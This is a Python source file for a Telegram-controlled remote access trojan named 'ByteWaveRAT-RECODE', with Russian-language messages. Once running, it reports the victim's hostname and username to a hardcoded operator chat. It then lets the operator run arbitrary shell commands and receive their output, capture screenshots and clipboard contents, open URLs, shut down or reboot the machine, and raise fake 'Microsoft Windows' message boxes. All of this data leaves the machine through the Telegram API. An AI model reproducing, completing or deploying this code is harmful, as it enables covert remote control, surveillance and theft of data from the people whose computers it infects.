import telebot
from telebot import types

import time
import urllib.request
import webbrowser
import subprocess
import ctypes
import threading
import os
from pyperclip import paste

from io import BytesIO
from mss import mss

class Client:
    PID = os.getpid()
    username = os.getlogin()
    hostname = os.getenv('COMPUTERNAME') or os.getenv('HOSTNAME')   

AUTHORIZED_CHAT_ID = 1013793895
bot_token = ""
bot = telebot.TeleBot(bot_token)

unauthorized_attempts = {}

def authorized_only(func):
    def wrapper(message):
        if message.chat.id == AUTHORIZED_CHAT_ID:
            func(message)
        else:
            user_id = message.from_user.id
            if user_id not in unauthorized_attempts:
                unauthorized_attempts[user_id] = 1
                try:
                    user_info = bot.get_chat_member(message.chat.id, user_id).user
                    username = user_info.username if user_info.username else f"User ID: {user_id}"
                    bot.send_message(AUTHORIZED_CHAT_ID, f"Попытка доступа от пользователя: {username}")
                except telebot.apihelper.ApiException as e:
                    bot.send_message(AUTHORIZED_CHAT_ID, f"Попытка доступа от пользователя с ID {user_id}")
            else:
                unauthorized_attempts[user_id] += 1

            bot.send_message(message.chat.id, "Вы не авторизованы для использования этой команды.")

    return wrapper

@bot.message_handler(commands=['start'])
@authorized_only
def handle_start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    screenshot_button = types.KeyboardButton('/screenshot')
    system_button = types.KeyboardButton('/system')
    help_button = types.KeyboardButton('/help')

    markup.add(screenshot_button, system_button, help_button)
    bot.send_message(message.chat.id, "ByteWaveRAT-RECODE [dev]", reply_markup=markup)

@bot.message_handler(commands=['system'])
@authorized_only
def handle_system(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    shutdown_button = types.KeyboardButton('Shutdown ❌')
    reboot_button = types.KeyboardButton('Reboot 🔄')
    sleep_button = types.KeyboardButton('Sleep 💤')
    back_button = types.KeyboardButton('Back ↩️')

    markup.add(shutdown_button, reboot_button, sleep_button, back_button)
    bot.send_message(message.chat.id, "System Commands:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == 'Back ↩️')
@authorized_only
def handle_back_to_main_menu(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    screenshot_button = types.KeyboardButton('/screenshot')
    system_button = types.KeyboardButton('/system')
    help_button = types.KeyboardButton('/help')

    markup.add(screenshot_button, system_button, help_button)
    bot.send_message(message.chat.id, "Back to Main Menu", reply_markup=markup)


@bot.message_handler(commands=['help'])
@authorized_only
def handle_help(message):
    response = """
    Список команд:
    /start - Начать
    /tries - Показать попытки доступа
    /sendmsg <chatid> <text> - Отправить сообщение человеку
    /url <URL> - Открыть URL в браузере
    /clipboard - Содержимое буфера обмена
    /screenshot - Сделать скриншот
    /cmd <command> - Выполнить команду в командной строке
    /msgbox <error|info|question> <text> - Открыть MessageBox
    /system - Показать системные команды
    /help - Показать это сообщение справки
    """
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda message: message.text == 'Shutdown ❌')
@authorized_only
def handle_shutdown(message):
    subprocess.run("shutdown /s", shell=True, capture_output=True, text=True, encoding='cp866')

@bot.message_handler(func=lambda message: message.text == 'Reboot 🔄')
@authorized_only
def handle_reboot(message):
    subprocess.run("shutdown /r", shell=True, capture_output=True, text=True, encoding='cp866')

@bot.message_handler(func=lambda message: message.text == 'Sleep 💤')
@authorized_only
def handle_sleep(message):
    bot.send_message(message.chat.id, "[SLEEP] in development...")

@bot.message_handler(commands=['clipboard'])
@authorized_only
def handle_tries(message):
    clipboard_content = paste()
    bot.send_message(message.chat.id, f"Clipboard content: {clipboard_content}")

@bot.message_handler(commands=['tries'])
@authorized_only
def handle_tries(message):
    if unauthorized_attempts:
        response = "Попытки доступа неавторизованных пользователей:\n"
        for user_id, attempts in unauthorized_attempts.items():
            try:
                user_info = bot.get_chat_member(message.chat.id, user_id).user
                username = user_info.username if user_info.username else f"User ID: {user_id}"
                response += f"{username}, Попыток: {attempts}\n"
            except telebot.apihelper.ApiException as e:
                response += f"User ID: {user_id}, Попыток: {attempts}\n"
    else:
        response = "Нет попыток доступа неавторизованных пользователей."

    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['sendmsg'])
@authorized_only
def handle_sendmsg(message):
    try:
        command, target_chat_id, *text_parts = message.text.split(' ')
        target_chat_id = int(target_chat_id)
        text = ' '.join(text_parts)
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        params = {
            'chat_id': target_chat_id,
            'text': text,
        }
        encoded_params = urllib.parse.urlencode(params)
        full_url = f"{url}?{encoded_params}"
        
        urllib.request.urlopen(full_url).read().decode('utf-8')
    except Exception as e:
        bot.send_message(message.chat.id, "Неправильный формат команды. Используйте: /sendmsg <chatid> <text>")

@bot.message_handler(commands=['url'])
@authorized_only
def handle_url(message):
    try:
        command, url = message.text.split(' ')
        webbrowser.open(url)
    except Exception as e:
        bot.send_message(message.chat.id, "Неправильный формат команды. Используйте: /url <URL>")

@bot.message_handler(commands=['screenshot'])
@authorized_only
def handle_screenshot(message):
    try:
        with mss() as sct:
            screenshot = sct.shot()
            with open(screenshot, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove("monitor-1.png")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка при снятии скриншота: {e}")

@bot.message_handler(commands=['cmd'])
@authorized_only
def handle_cmd(message):
    try:
        command = message.text.split(' ', 1)[1]
        if command.startswith("cd "):
            path = command.split(' ', 1)[1]
            try:
                os.chdir(path)
                response = f"Директория изменена на {os.getcwd()}"
            except Exception as cd_error:
                response = f"Ошибка при смене директории: {cd_error}"
        else:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='cp866')
                response = f"STDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
            except Exception as cmd_error:
                response = f"Ошибка при выполнении команды: {cmd_error}"

        bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, "Неправильный формат команды. Используйте: /cmd <command>")

def open_msgbox(text, msg_type):
    types = {'error': 0x10, 'info': 0x40, 'question': 0x20}
    if msg_type.lower() not in types:
        return

    msg_type = msg_type.lower()
    icon_type = types[msg_type]

    ctypes.windll.user32.MessageBoxW(0, text, f"Microsoft Windows", icon_type | 0x1000)  # Добавляем флаг MB_SYSTEMMODAL


@bot.message_handler(commands=['msgbox'])
@authorized_only
def handle_msgbox(message):
    try:
        command, msg_type, *text_parts = message.text.split(' ')
        text = ' '.join(text_parts)

        msgbox_thread = threading.Thread(target=open_msgbox, args=(text, msg_type))
        msgbox_thread.start()

        bot.send_message(message.chat.id, f"Открыто MessageBox с типом {msg_type.capitalize()}.")
    except Exception as e:
        bot.send_message(message.chat.id, "Неправильный формат команды. Используйте: /msgbox <error|info|question> <text>")



while True:
    try:
        print("BOT STARTED.")
        bot.send_message(AUTHORIZED_CHAT_ID, f"ByteWave RAT [RECODE]: Connected to {Client.hostname}, {Client.username}. PID: {Client.PID}")
        bot.polling(none_stop=True)
    except Exception as e:
        time.sleep(3)
        print(e)
